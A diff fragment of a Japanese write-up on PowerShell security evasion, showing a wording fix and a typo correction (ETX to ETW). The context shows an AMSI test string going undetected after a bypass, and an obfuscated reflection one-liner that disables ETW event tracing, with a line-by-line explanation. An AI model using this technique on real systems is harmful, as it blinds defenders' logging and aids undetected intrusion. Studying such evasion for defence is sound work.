@@ -227,13 +227,13 @@ PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
     + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
     + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 ```
-それでは先程のPowershellコードを実行すると、検知されていないことが分かった
+それでは先程のPowershellコードを実行すると、検知されないことが分かった
 ```powershell
 PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 ```
 
-また、ETX(Event Tracing for Windows)を無効にする
+また、ETW(Event Tracing for Windows)を無効にする
 ```powershell
 # [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetFIeLD("m_enabled","NOnPUBLIC,Instance").SetValue([ReF].AsSEMBLY.GEtTyPe("System.Management.Automation.Tracing.PSEtwLogProvider").GetFIeLD("etwProvider","NOnPUBLIC,StATIc").GETVALue($XCg4haX2thXmkYPuR),0) 
 # [Reflection.Assembly]::LoadWithPartialName("System.Core")で、アセンブリ「System.Core.dll」をロード
